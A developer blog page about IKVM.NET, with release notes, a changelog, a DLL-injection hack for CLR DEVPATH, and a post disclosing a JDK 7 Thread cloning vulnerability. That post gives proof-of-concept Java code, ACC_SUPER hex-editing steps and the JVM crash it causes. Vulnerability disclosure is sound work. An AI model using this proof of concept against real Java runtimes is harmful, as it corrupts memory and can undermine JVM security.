<DIV style="BACKGROUND-COLOR: black"><CODE style="COLOR: #f0f0f0"><SPAN style="COLOR: #55ff55">pi@raspberrypi</SPAN><SPAN style="COLOR: #5555db"> ~ $</SPAN> sudo apt-get install ikvm<BR><SPAN style="COLOR: #55ff55">pi@raspberrypi</SPAN><SPAN style="COLOR: #5555db"> ~ $</SPAN> ikvmc -out:javac.exe -r:/usr/lib/ikvm/IKVM.OpenJDK.Tools.dll -main:com.sun.tools.javac.Main<BR><SPAN style="COLOR: #55ff55">pi@raspberrypi</SPAN><SPAN style="COLOR: #5555db"> ~ $</SPAN> vi Hello.java<BR><SPAN style="COLOR: #55ff55">pi@raspberrypi</SPAN><SPAN style="COLOR: #5555db"> ~ $</SPAN> mono javac.exe Hello.java<BR><SPAN style="COLOR: #55ff55">pi@raspberrypi</SPAN><SPAN style="COLOR: #5555db"> ~ $</SPAN> ikvm Hello<BR>Hello World </CODE></DIV>
<P>Amazing...</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/28/2012 21:19:04 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=6ae059e4-c328-4de0-9f9d-9def73b42adf"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=6ae059e4-c328-4de0-9f9d-9def73b42adf">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 16 December 2012</h2></div>
<div class="newsItems"><a name="a3c6aaaa9-d738-459b-8cfe-3a8ab77585f0"></a><div class="entry">
	<h3 class="entryTitle">A Hack To Make CLR's DEVPATH Suck Less</h3>
	<div class="entryBody">
		<P>The CLR's <A href="http://msdn.microsoft.com/en-us/library/cskzh7h6.aspx">DEVPATH</A> feature has always been <A href="http://blogs.msdn.com/b/junfeng/archive/2006/04/16/576998.aspx">broken</A> and its brokeness <A href="http://connect.microsoft.com/VisualStudio/feedback/details/689691/devpath-is-failing-when-running-web-applications-under-net-4">varied</A> over the years, but for my purposes it was a very useful feature. However with .NET .4.5 Microsoft decided to up the ante. If you have configured your .NET 4.5 runtime as a <A href="http://msdn.microsoft.com/en-us/library/tyshaw37(v=vs.110).aspx">"developer installation"</A>, ngen will fail to generate native images for framework assemblies. This means that after Windows Update services mscorlib.dll, no native images will be used anymore.</P>
<P>Obviously you can work around this by editing the machine.config and re-running ngen, but that is a bit of a pain so decided to hack together a workaround.</P>
<P>The basic idea is to have a DLL that gets <A href="http://msdn.microsoft.com/en-us/library/windows/desktop/dd744762(v=vs.85).aspx">injected</A> into (nearly) every process and patches <CODE><STRONG>mscoree.dll</STRONG></CODE> to make <A href="http://translate.google.com/translate?hl=en&amp;sl=zh-CN&amp;u=http://msdn.microsoft.com/zh-cn/library/ms230281(v%3Dvs.80).aspx&amp;prev=/search%3Fq%3DCreateConfigStream%26hl%3Den%26tbo%3Dd%26biw%3D1036%26bih%3D1063&amp;sa=X&amp;ei=UqLNUImSIeqj0QWKvoCoBQ&amp;ved=0CD4Q7gEwAQ">CreateConfigStream</A> read <STRONG>developer-machine.config</STRONG> instead of <STRONG>machine.config</STRONG> if the <CODE><STRONG>DEVPATH</STRONG></CODE> environment variable is set.</P>
<P>The source and binaries are available <A href="http://www.frijters.net/DevPathHook.zip">here</A>. Like the Microsoft DEVPATH code, this is untested so there is no warranty and use at your own risk. Bug reports are welcome of course.</P>
<P>There is no installer and there are no installation instructions, because frankly, if you don't know how to install it you probably shouldn't be doing so anyway..</P>
<P>The overhead is fairly low. If you don't have DEVPATH set the DLL will immediately unload again. The file size is only 3KB and in memory it will only use a single 4KB page.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/16/2012 11:47:50 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3c6aaaa9-d738-459b-8cfe-3a8ab77585f0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3c6aaaa9-d738-459b-8cfe-3a8ab77585f0">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 12 December 2012</h2></div>
<div class="newsItems"><a name="a144a7554-bcdb-4ae9-bae1-5eca64a51455"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Time for another development snapshot.</P>
<P>Changes:</P>
<UL>
<LI>Do the "no serialization" check before calling Serialization.AddAutomagicSerialization() to avoid triggering the class initializer (which will try to load SerializableAttribute, which is not available everywhere).</LI>
<LI>Removed more ConstructorBuilder usage to fix regression (constructor custom attributes specified map.xml were not applied).</LI>
<LI>Construct the System assembly name from the mscorlib name to support other runtimes.</LI>
<LI>Removed dummy constructor from __Helper class.</LI>
<LI>Removed remaining ConstructorBuilder usages.</LI>
<LI>Removed unnecessary MethodBuilder casts.</LI>
<LI>Removed permanent app.config files and changed build process to only generate them when doing a .NET 2.0 build.</LI>
<LI>Bug fix. Transient field modifier should also be retained on literal fields.</LI>
<LI>Bug fix. Field.getModifiers() should only return the relevant modifiers.</LI>
<LI>Removed some O(n^2) operations to improve handling of class files with a large number of fields.</LI>
<LI>Bug fix. Set AddressOfRawData in IMAGE_DEBUG_DIRECTORY.</LI>
<LI>Bug fix. Class.forName("") should not throw System.ArgumentException.</LI>
<LI>Bug fix. Off-by-one error in local ref index reusing. Fix for bug #3575555.</LI>
<LI>Bug fix. Don't try to inject DynamicMethod in array types (applies to array.clone() method for MethodHandles).</LI>
<LI>Bug fix. Abstract generic methods are not supported. Fix for #3579785.</LI>
<LI>Bug fix. Interface mappings can be "incomplete". Fix for bug #3581564.</LI>
<LI>Added (optional) support for building without System.Core.dll dependency.</LI>
<LI>Bug fix. The local variable state at the end of an exception block (if the last instruction is a local variable store) needs to be merged into the exception handler state.</LI>
<LI>Changed FileNotFoundException message in the case of an access denied to match the JDK message. JRuby depends on this.</LI>
<LI>Renamed Adler32 "checksum" field to "adler", because JRuby depends on this.</LI>
<LI>Bug fix. The static compiler cannot use a different way to encode erased array types than the runtime compiler (because otherwise the runtime can't override statically compiled methods).</LI>
<LI>Fixed native library build to explicitly pass /MACHINE option to linker to avoid warning.</LI>
<LI>Implemented StandardGlyphVector.performDefaultLayout() and setGlyphPosition(int, Point2D).</LI>
<LI>Added missing SecuritySafeCritical attribute.</LI>
<LI>Changed build infrastructure to support targetting .NET 4.0 on systems where 4.5 is installed.</LI>
<LI>IKVM.Reflection: Bug fix. Ignore unknown metadata streams instead of throwing a BadImageFormatException. The CLR ignores these streams as well and some obfuscators add them.</LI>
<LI>IKVM.Reflection: Added TypeInfo (from .NET 4.5).</LI>
<LI>IKVM.Reflection: Implemented caching for TypeDefImpl.IsGenericTypeDefinition property.</LI>
<LI>IKVM.Reflection: Added new .NET 4.5 TypeBuilder.DefineNestedType() overload.</LI>
<LI>IKVM.Reflection: Added new .NET 4.5 API TypeBuilder.CreateTypeInfo().</LI>
<LI>IKVM.Reflection: Added new .NET 4.0 overload of TypeBuilder.DefineProperty().</LI>
<LI>IKVM.Reflection: Added new .NET 4.5 property AssemblyName.CultureName.</LI>
<LI>IKVM.Reflection: When an assembly name has a duplicate key, throw FileLoadException like .NET 4.x does instead of COMException like .NET 2.0 does.</LI>
<LI>IKVM.Reflection: Added new .NET 4.5 property MethodBase.MethodImplementationFlags.</LI>
<LI>IKVM.Reflection: Added new .NET 4.5 properties CustomAttributeNamedArgument.IsField and CustomAttributeNamedArgument.MemberName.</LI>
<LI>IKVM.Reflection: Added new .NET 4.5 properties EventInfo.AddMethod, EventInfo.RaiseMethod and EventInfo.RemoveMethod.</LI>
<LI>IKVM.Reflection: Added new .NET 4.5 property ParameterInfo.HasDefaultValue.</LI>
<LI>IKVM.Reflection: Added new .NET 4.5 properties PropertyInfo.GetMethod and PropertyInfo.SetMethod.</LI>
<LI>IKVM.Reflection: Added Universe.DefineDynamicAssembly(AssemblyName, AssemblyBuilderAccess, IEnumerable<CUSTOMATTRIBUTEBUILDER>) that corresponds to new .NET 4.5 API AssemblyBuilder.DefineDynamicAssembly(...).</LI>
<LI>IKVM.Reflection: Added new .NET 4.5 method EnumBuilder.CreateTypeInfo().</LI>
<LI>IKVM.Reflection: Added new .NET 4.0 method GetCustomAttributesData() to Assembly, MemberInfo, Module and ParameterInfo.</LI>
<LI>IKVM.Reflection: Added new .NET 4.5 property CustomAttributes to Assembly, MemberInfo, Module and ParameterInfo.</LI>
<LI>IKVM.Reflection: Added new .NET 4.5 property Type.GenericTypeArguments.</LI>
<LI>IKVM.Reflection: Added new .NET 4.0 methods Type.GetEnumNames(), Type.GetEnumName() and Type.IsEnumDefined().</LI>
<LI>IKVM.Reflection: Added new .NET 4.5 properties Assembly.ExportedTypes and Assembly.DefinedTypes.</LI>
<LI>IKVM.Reflection: Added new .NET 4.5 property Assembly.Modules.</LI>
<LI>IKVM.Reflection: Moved local var signature token creation to a more logical location.</LI>
<LI>IKVM.Reflection: Added new .NET 4.5 methods ConstructorBuilder.SetMethodBody() and MethodBuilder.SetMethodBody(). Note that the implementation is currently completely untested.</LI>
<LI>IKVM.Reflection: Added (old) method MethodBuilder.CreateMethodBody() that is now trivial to implement.</LI>
<LI>IKVM.Reflection: Added new .NET 4.0 property Assembly.IsDynamic.</LI>
<LI>IKVM.Reflection: Added (old) API Module.GetSignerCertificate().</LI>
<LI>IKVM.Reflection: Bug fix. While reading the Cecil source I realized that array bounds are signed.</LI>
<LI>IKVM.Reflection: Stop relying on System.Reflection.AssemblyName to compute public key token from public key.</LI>
<LI>IKVM.Reflection: Small optimization to table record allocation. Thanks to Marek for the pointer.</LI>
<LI>IKVM.Reflection: Implemented LocalVariableInfo.ToString().</LI>
<LI>IKVM.Reflection: Bug fix. ModuleReader.ResolveMember() should support types. Thanks to Jb Evain for finding this.</LI>
<LI>IKVM.Reflection: Bug fix. LocalBuilder should extend LocalVariableInfo.</LI>
<LI>IKVM.Reflection: Made AssemblyBuilder.__AssemblyFlags a read/write property and marked __SetAssemblyFlags() obsolete.</LI>
<LI>IKVM.Reflection: Bug fix. Changed AssemblyName.ProcessorArchitecture to match (weird) .NET behavior. When reading the property it returns the architecture of the PE file, not the field from the AssemblyDef record.</LI>
<LI>IKVM.Reflection: Throw InvalidOperationException when MethodBuilder.DefineGenericParameters() is called a second time.</LI>
<LI>IKVM.Reflection: Added UniverseOptions.DontProvideAutomaticDefaultConstructor to disable the "helpful" creation of a default constructor.</LI>
<LI>IKVM.Reflection: Fixed ExportedType resolver to support types defined in another module in this assembly.</LI>
<LI>IKVM.Reflection: Added the Assembly.ModuleResolve event.</LI>
<LI>IKVM.Reflection: If missing member resolution is enabled, automatically create missing modules as needed.</LI>
<LI>IKVM.Reflection: Simplified LazyForwardType resolution to reuse ResolveExportedType() and thus always set the metadata token for forwarded missing types.</LI>
<LI>IKVM.Reflection: Added Type.__IsTypeForwarder property to let mcs distinguish between "normal" missing types and forwarded missing types.</LI>
<LI>IKVM.Reflection: When calling MethodBuilder.DefineParameter() multiple times for the same parameter, we would (sometimes) not store the ParameterBuilder and this would cause the resulting PE file to be corrupt. Now we store the duplicate Param records like SRE does.</LI>
<LI>IKVM.Reflection: Added UniverseOptions.MetadataOnly.</LI>
<LI>IKVM.Reflection: Made user string heap loading lazy.</LI>
<LI>IKVM.Reflection: Bug fix. If SizeOfOptionalHeader is greater than the number of bytes we read from the optional header, we should skip the additional bytes. If it is less, the image is invalid. Thanks to Jb Evain.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.3.4728.zip">ikvmbin-7.3.4728.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/12/2012 10:25:12 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=144a7554-bcdb-4ae9-bae1-5eca64a51455"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=144a7554-bcdb-4ae9-bae1-5eca64a51455">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 10 December 2012</h2></div>
<div class="newsItems"><a name="a926e3554-259e-49a6-82fc-459fbd61ac19"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.2 Released</h3>
	<div class="entryBody">
		<P>I've released IKVM.NET 7.2 to <A href="https://sourceforge.net/projects/ikvm/files/ikvm/7.2.4630.5/">SourceForge</A> and <A href="http://nuget.org/packages/IKVM">NuGet</A>. The binaries are identical to the ones in <A href="/PermaLink.aspx?guid=59fcd4ea-82ee-4217-828d-5131271e4bd8">release candidate 5</A>.</P>
<P><B>Release Notes</B></P>
<P>This document lists the improvements, known issues and incompatibilities.</P>
<P><STRONG>What's New</STRONG> (relative to <A href="/PermaLink.aspx?guid=c004201f-a226-4a98-8b12-904378e773d5">IKVM.NET 7.1</A>):</P>
<UL>
<LI>Integrated OpenJDK 7 u6 b24. 
<LI>Improved java.util.concurrent performance. 
<LI>Removed org.omg.PortableInterceptor.UNKNOWN class, that is not part of [Open]JDK rt.jar. 
<LI>Added ZipFile constructor that was added in Java 7. 
<LI>Add support for running with headless awt toolkit. 
<LI>Changed ikvmc to apply custom attribute annotations on annotation types to the corresponding custom attribute that is generated (and allow AttributeUsageAttribute to override the default AttributeUsageAttribute generated from the @Target annotation). 
<LI>Added app.config files for executables to allow them to run on .NET 4.5 on Windows 8 without triggering the .NET 3.5 auto download. 
<LI>Added (optional) support for building without System.Core.dll dependency. 
<LI>Disabled AppDomain.ProcessExit hook to run shutdown hooks when running on Mono to workaround <A href="https://bugzilla.xamarin.com/show_bug.cgi?id=5650">https://bugzilla.xamarin.com/show_bug.cgi?id=5650</A>. 
<LI>Several verifier fixes. 
<LI>Several metadata reflection fixes. 
<LI>Fixed two try/finally block code gen bugs. 
<LI>Various other minor fixes. 
<LI>IKVM.Reflection: Many minor bug fixes and improvements. 
<LI>IKVM.Reflection: Added most new .NET 4.5 APIs. 
<LI>IKVM.Reflection: Added experimental support for generating Windows Runtime (.winmd) assemblies. 
<LI>IKVM.Reflection: Added missing DefineResource() APIs to ModuleBuilder and AssemblyBuilder. 
<LI>IKVM.Reflection: Added co-/contra-variance support to Type.IsAssignableFrom(). 
<LI>IKVM.Reflection: Added support for using the .NETCore v4.5 aka Metro profile mscorlib.dll. 
<LI>IKVM.Reflection: Added UniverseOptions.DisablePseudoCustomAttributeRetrieval to disable returning pseudo custom attributes. 
<LI>IKVM.Reflection: Bug fix. Ignore unknown metadata streams. 
<LI>IKVM.Reflection: Bug fix. Set AddressOfRawData in IMAGE_DEBUG_DIRECTORY.</LI></UL>
<P><B>Runtime</B></P>
<UL>
<LI>Code unloading (aka class GC) is not supported. 
<LI>In Java static initializers can deadlock, on .NET some threads can see uninitialized state in cases where deadlock would occur on the JVM. 
<LI>JNI<BR>&nbsp; 
<UL>
<LI>Only supported in the default AppDomain. 
<LI>Only the JNICALL calling convention is supported! (On Windows, HotSpot appears to also support the cdecl calling convention). 
<LI>Cannot call string contructors on already existing string instances 
<LI>A few limitations in Invocation API support<BR>&nbsp; 
<UL>
<LI>The Invocation API is only supported when running on .NET. 
<LI>JNI_CreateJavaVM: init options "-verbose[:class|:gc|:jni]", "vfprintf", "exit" and "abort" are not implemented. The JDK 1.1 version of JavaVMInitArgs isn't supported. 
<LI>JNI_GetDefaultJavaVMInitArgs not implemented 
<LI>JNI_GetCreatedJavaVMs only returns the JavaVM if the VM was started through JNI or a JNI call that retrieves the JavaVM has already occurred. 
<LI>DestroyJVM is only partially implemented (it waits until there are no more non-daemon Java threads and then returns JNI_ERR). 
<LI>DetachCurrentThread doesn't release monitors held by the thread.</LI></UL>
<LI>Native libraries are never unloaded (because code unloading is not supported).</LI></UL>
<LI>The JVM allows any reference type to be passed where an interface reference is expected (and to store any reference type in an interface reference type field), on IKVM this results in an IncompatibleClassChangeError. 
<LI>monitorenter / monitorexit cannot be used on unitialized this reference. 
<LI>Floating point is not fully spec compliant. 
<LI>A method returning a boolean that returns an integer other than 0 or 1 behaves differently (this also applies to byte/char/short and for method parameters). 
<LI>Synchronized blocks are not async exception safe. 
<LI>Ghost arrays don't throw ArrayStoreException when you store an object that doesn't implement the ghost interface. 
<LI>Class loading is more eager than on the reference VM. 
<LI>Interface implementation methods are never really final (interface can be reimplemented by .NET subclasses). 
<LI>JSR-133 finalization spec change is not fully implemented. The JSR-133 changes dictate that an object should not be finalized unless the Object constructor has run successfully, but this isn't implemented. 
<LI><A href="http://openjdk.java.net/projects/jdk7/features/#fa535991">Strict class-file checking</A> is not implemented. 
<LI>If a class with a finalizer and static initializer allocates instances of itself in the static initializer and the static initializer subsequently fails, the .NET runtime may abort the application when trying to finalize the objects.</LI></UL>
<P><B>Static Compiler (ikvmc)</B></P>
<UL>
<LI>Some subtle differences with ikvmc compiled code for public members inherited from non-public base classes (so called "access stubs"). Because the access stub lives in a derived class, when accessing a member in a base class, the derived cctor will be run whereas java (and ikvm) only runs the base cctor. 
<LI>Try blocks around base class ctor invocation result in unverifiable code (no known compilers produce this type of code). 
<LI>Try/catch blocks before base class ctor invocation result in unverifiable code (this actually happens with the Eclipse compiler when you pass a class literal to the base class ctor and compile with -target 1.4). 
<LI>Only code compiled together during a single compilation fully obeys the JLS binary compatibility rules. </LI></UL>
<P><B>Class Library</B></P>
<P>Most class library code is based on OpenJDK 7u6 build 24. Below is a list of divergences and IKVM.NET specific implementation notes.</P>
<TABLE cellSpacing=0>
<TBODY>
<TR>
<TD style="BORDER-TOP: black 1px solid">com.sun.security.auth.module&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD style="BORDER-TOP: black 1px solid">Only implemented on Windows.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.applet</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.awt</TD>
<TD>Partial System.Windows.Forms based back-end. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.io.Console</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.lang.instrument</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.lang.management</TD>
<TD>Limited implementation.</TD></TR>
<TR>
<TD>java.net</TD>
<TD><A href="http://openjdk.java.net/projects/jdk7/features/#f405">SCTP</A> and <A href="http://openjdk.java.net/projects/jdk7/features/#f639">SDP</A> not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.net.ProxySelector</TD>
<TD>Getting the default system proxy for a URL is not implemented.</TD></TR>
<TR>
<TD>java.nio.file</TD>
<TD>Most optional features (e.g. ACLs) are not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.text.Bidi</TD>
<TD>Not supported.</TD></TR>
<TR>
<TD>java.util.zip</TD>
<TD>Partially based on GNU Classpath implementation.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.crypto</TD>
<TD><A href="http://openjdk.java.net/projects/jdk7/features/#f73">ECC</A> is not implemented.</TD></TR>
<TR>
<TD>javax.imageio.plugins.jpeg</TD>
<TD>Partial implementation. JPEGs can be read and written and there is limited metadata support.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.management</TD>
<TD>Limited implementation.</TD></TR>
<TR>
<TD>javax.print</TD>
<TD>There is a Win32 specific printing implementation. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.script</TD>
<TD>ECMAScript implementation is not included.</TD></TR>
<TR>
<TD>javax.smartcardio</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.sound</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.swing</TD>
<TD>Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.tools</TD>
<TD>Not supported.</TD></TR>
<TR>
<TD>org.ietfs.jgss</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>sun.jdbc.odbc</TD>
<TD>Implementation based on .NET ODBC managed provider.</TD></TR>
<TR>
<TD>sun.net.www.content.audio</TD>
<TD>Audio content handlers not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD style="BORDER-BOTTOM: black 1px solid">sun.net.www.content.image</TD>
<TD style="BORDER-BOTTOM: black 1px solid">Not supported.</TD></TR></TBODY></TABLE>
<P>The entire public API is available, so "Not implemented." for javax.smartcardio, for example, means that the API is there but there is no back-end to provide the actual smartcard communication support. "Not supported." means that the code is there and probably works at least somewhat, but that I'm less likely to fix bugs reported in these areas, but patches are welcome, of course.</P>
<P>Specific API notes:</P>
<UL>
<LI>java.lang.Thread.stop(Throwable t) doesn't support throwing arbitrary exceptions on other threads (only java.lang.ThreadDeath). 
<LI>java.lang.Thread.holdsLock(Object o) causes a spurious notify on the object (this is allowed by the J2SE 5.0 spec). 
<LI>java.lang.String.intern() strings are never garbage collected. 
<LI>Weak/soft references and reference queues are inefficient and do not fully implement the required semantics. 
<LI>java.lang.ref.SoftReference: Soft references are not guaranteed to be cleared before an OutOfMemoryError is thrown. 
<LI>Threads started outside of Java aren't "visible" (e.g. in ThreadGroup.enumerate()) until they first call Thread.currentThread(). 
<LI>java.lang.Thread.getState() returns WAITING or TIMED_WAITING instead of BLOCKING when we're inside Object.wait() and blocking to re-acquire the monitor. 
<LI>java.nio.channel.FileChannel.lock() shared locks are only supported on Windows NT derived operating systems. 
<LI>java.lang.SecurityManager: Deprecated methods not implemented: classDepth(String), inClass(String), classLoaderDepth(), currentLoadedClass(), currentClassLoader(), inClassLoader()</LI></UL>
<P><B>Supported Platforms</B></P>
<P>This release has been tested on the following CLI implementations / platforms:</P>
<TABLE border=0>
<TBODY>
<TR>
<TD><B>CLI Implementation&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Architecture&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Operating System</B></TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x86</TD>
<TD>Windows 8</TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x64</TD>
<TD>Windows 8</TD></TR>
<TR>
<TD>.NET 4.5</TD>
<TD>x86</TD>
<TD>Windows 8</TD></TR>
<TR>
<TD>.NET 4.5</TD>
<TD>x64</TD>
<TD>Windows 8</TD></TR></TBODY></TABLE>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/10/2012 07:51:13 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=926e3554-259e-49a6-82fc-459fbd61ac19"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=926e3554-259e-49a6-82fc-459fbd61ac19">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 06 December 2012</h2></div>
<div class="newsItems"><a name="a59fcd4ea-82ee-4217-828d-5131271e4bd8"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.2 Release Candidate 5</h3>
	<div class="entryBody">
		<P>Apologies for the ridiculous delay. I've been busy. This is the final release candidate.</P>
<P>Changes (relative to rc 4):</P>
<UL>
<LI>Updated version to 7.2.4630.5</LI>
<LI>Bug fix. The static compiler cannot use a different way to encode erased array types than the runtime compiler (because otherwise the runtime can't override statically compiled methods).</LI>
<LI>Added missing SecuritySafeCritical attribute.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.2.4630.5.zip">ikvmbin-7.2.4630.5.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-7.2.4630.5.zip">ikvmsrc-7.2.4630.5.zip</A>, <A href="http://www.frijters.net/openjdk-7u6-b24-stripped.zip">openjdk-7u6-b24-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/06/2012 10:13:45 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=59fcd4ea-82ee-4217-828d-5131271e4bd8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=59fcd4ea-82ee-4217-828d-5131271e4bd8">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 01 November 2012</h2></div>
<div class="newsItems"><a name="a23cced47-ccdb-460d-acc9-ce16154ab6a5"></a><div class="entry">
	<h3 class="entryTitle">JDK 7 Thread Cloning Vulnerability</h3>
	<div class="entryBody">
		<P style="PADDING-LEFT: 40px"><EM>This blog entry was originally posted on <A HREF="/CommentView.aspx?guid=2b341f75-480c-4154-adc8-ce5571da35c3">June 23, 2011</A>, but was deleted as Oracle asked me to take it down while they investigate. After more than a year, the issue still has not been addressed, so I notified Oracle that I wanted to repost the blog entry and received no response. -- Jeroen</EM></P>
<P>I <A href="http://mail.openjdk.java.net/pipermail/core-libs-dev/2010-August/004742.html">warned on the mailing list</A> when this came up, but apparently was ignored,so maybe a blog post will help.</P>
<P>In one of last year's updates of JDK 6 the cloning vulnerability was fixed in a hackish, but clever and safe way. Now in JDK 7 they try to fix it by overriding Object.clone() with a version that simply throws CloneNotSupportedException. The only problem is, in Java (and .NET too) overriding a method is not a safe way to make the base class method unavailable.</P>
<P>The (still) not so well known <A HREF="/PermaLink.aspx?guid=99fcff6c-8ab7-4358-9467-ddf71dd20acd">ACC_SUPER</A> flag allows you (when it isn't set) to call arbitrary (accessible) methods in your super class hierarchy. So Thread.clone() can be skipped and Object.clone() can be called from any Thread subclass that doesn't have the ACC_SUPER flag set.</P>
<P>Here's an example:</P>
<P><CODE>class Clone extends Thread implements Cloneable {<BR>&nbsp; public Object clone() {<BR>&nbsp;&nbsp;&nbsp; try { return super.clone(); }<BR>&nbsp;&nbsp;&nbsp; catch (CloneNotSupportedException _) { throw new Error(); }<BR>&nbsp; }<BR>}</CODE></P>
<P><CODE>class Demo {<BR>&nbsp; public static void main(String[] args) throws Throwable {<BR>&nbsp;&nbsp;&nbsp; Clone c1 = new Clone() {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public void run() {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (;;) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; };<BR>&nbsp;&nbsp;&nbsp; c1.start();<BR>&nbsp;&nbsp;&nbsp; Thread t = (Thread)c1.clone();<BR>&nbsp;&nbsp;&nbsp; c1.stop();<BR>&nbsp;&nbsp;&nbsp; c1.join();<BR>&nbsp;&nbsp;&nbsp; System.gc();<BR>&nbsp;&nbsp;&nbsp; t.stop();<BR>&nbsp; }<BR>}</CODE></P>
<P>Note that after you compile this with <STRONG>JDK 6</STRONG> you'll need to edit the Clone.class to clear the ACC_SUPER flag. Use a hex editor to replace 20 (hex) with 00 or download a copy <A href="http://www.frijters.net/Clone.class">here</A>.</P>
<P>Now run it:</P>
<P><CODE>C:\j&gt;\jdk1.7-b145\bin\java Demo<BR>#<BR># A fatal error has been detected by the Java Runtime Environment:<BR>#<BR># EXCEPTION_ACCESS_VIOLATION (0xc0000005) at pc=0x000000006cd5af54, pid=3708, t id=10460<BR>#<BR># JRE version: 7.0-b145<BR># Java VM: Java HotSpot(TM) 64-Bit Server VM (21.0-b15 mixed mode windows-amd64 compressed oops)<BR># Problematic frame:<BR># V [jvm.dll+0x1caf54]<BR>#<BR># Failed to write core dump. Minidumps are not enabled by default on client versions of Windows<BR>#<BR># An error report file with more information is saved as:<BR># C:\j\hs_err_pid3708.log<BR>#<BR># If you would like to submit a bug report, please visit:<BR># http://bugreport.sun.com/bugreport/crash.jsp<BR>#</CODE></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/01/2012 16:11:20 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=23cced47-ccdb-460d-acc9-ce16154ab6a5"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=23cced47-ccdb-460d-acc9-ce16154ab6a5">Comments [9]</a>
		
		<br clear="all">
	</div>
